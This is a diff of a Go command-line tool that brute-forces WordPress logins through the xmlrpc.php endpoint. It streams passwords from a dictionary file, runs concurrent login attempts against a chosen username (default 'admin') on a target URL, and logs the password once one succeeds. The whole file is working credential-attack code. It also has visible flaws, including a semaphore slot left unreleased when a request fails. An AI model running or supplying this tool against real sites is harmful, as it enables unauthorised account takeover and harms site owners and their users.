@@ -1,52 +1,116 @@
 package main
 
 import (
-  "fmt"
-  "log"
+	"errors"
+	"flag"
+	"fmt"
+	"log/slog"
+	"os"
 )
 
-func main() {
-  args := parseCommandlineArgs()
-
-  passwords := make(chan string)
-  go getPasswords(args["dict"].(string), passwords)
-
-  url := fmt.Sprintf("%s/xmlrpc.php", args["url"].(string))
-  results := make(chan Result)
-
-  log.Printf("Initiating Requests...\n")
-
-  username := args["username"].(string)
-  maxWorkers := args["maxWorkers"].(int)
-
-  executor(url, username, passwords, results, maxWorkers)
-
-  attempts := 1
-  for {
-    result := <-results
-
-    fmt.Printf("Password Attempts: %d\r", attempts)
-    attempts++
-
-    if result.Success {
-      fmt.Println()
-      log.Printf("Password Found: %s\n", result.Credentials.Password)
-      break
-    }
-  }
+type CommandLineArgs struct {
+	Url        string
+	Dict       string
+	Username   string
+	MaxWorkers int
 }
 
-func executor(url string, username string, passwords <-chan string, results chan<- Result, maxWorkers int) {
-  sem := make(chan int, maxWorkers)
+func parseCommandlineArgs() (*CommandLineArgs, error) {
+	url := flag.String("url", "", "URL to WordPress website to target (without trailing /)")
+	pwdList := flag.String("dict", "./dict/dict.txt", "A text dictionary containing passwords to try")
+	username := flag.String("user", "admin", "Username to brute-force")
+	maxWorkers := flag.Int("routines", 10, "Maximum number of Goroutines to spawn")
+	flag.Parse()
 
-  for password := range passwords {
-    credentials := Credentials{username, password}
+	if *url == "" {
+		return nil, errors.New("website url missing.")
+	}
 
-    go func(creds Credentials) {
-      sem <- 1
-      result := attemptLogin(url, credentials)
-      results <- result
-      <-sem
-    }(credentials)
-  }
+	args := &CommandLineArgs{
+		Url:        *url,
+		Dict:       *pwdList,
+		Username:   *username,
+		MaxWorkers: *maxWorkers,
+	}
+
+	return args, nil
+}
+
+func run() error {
+	logger := slog.New(slog.NewJSONHandler(os.Stdout, nil))
+	args, err := parseCommandlineArgs()
+	if err != nil {
+		return err
+	}
+
+	pwdChan, err := getPasswords(args.Dict)
+	if err != nil {
+		return fmt.Errorf("failed to read passwords file: %w", err)
+	}
+	defer close(pwdChan)
+
+	url := fmt.Sprintf("%s/xmlrpc.php", args.Url)
+	results := make(chan Result)
+
+	executor := &Executor{
+		Url:        url,
+		MaxWorkers: args.MaxWorkers,
+		Logger:     logger,
+	}
+	executor.Run(args.Username, pwdChan, results)
+
+	attempts := 1
+	for {
+		result := <-results
+		logger.Info("num password Attempt", "attempts", attempts)
+		attempts++
+
+		if result.Success {
+			fmt.Println()
+			logger.Info("password Found", "password", result.Password)
+			break
+		}
+	}
+
+	return nil
+}
+
+func main() {
+	if err := run(); err != nil {
+		fmt.Fprintf(os.Stderr, "error: %s\n", err.Error())
+		os.Exit(1)
+	}
+}
+
+type Executor struct {
+	Url        string
+	Logger     *slog.Logger
+	MaxWorkers int
+}
+
+func (e *Executor) Run(
+	username string,
+	passwords <-chan string,
+	results chan<- Result,
+) {
+	e.Logger.Info("initiating Requests")
+	sem := make(chan int, e.MaxWorkers)
+
+	for password := range passwords {
+		credentials := &Credentials{username, password}
+
+		go func(creds *Credentials) {
+			sem <- 1
+
+			e.Logger.Info("sending out request")
+			result, err := attemptLogin(e.Url, credentials)
+			if err != nil {
+				e.Logger.Error("failed to attempt login", "error", err.Error())
+				return
+			}
+
+			results <- *result
+			<-sem
+		}(credentials)
+	}
 }
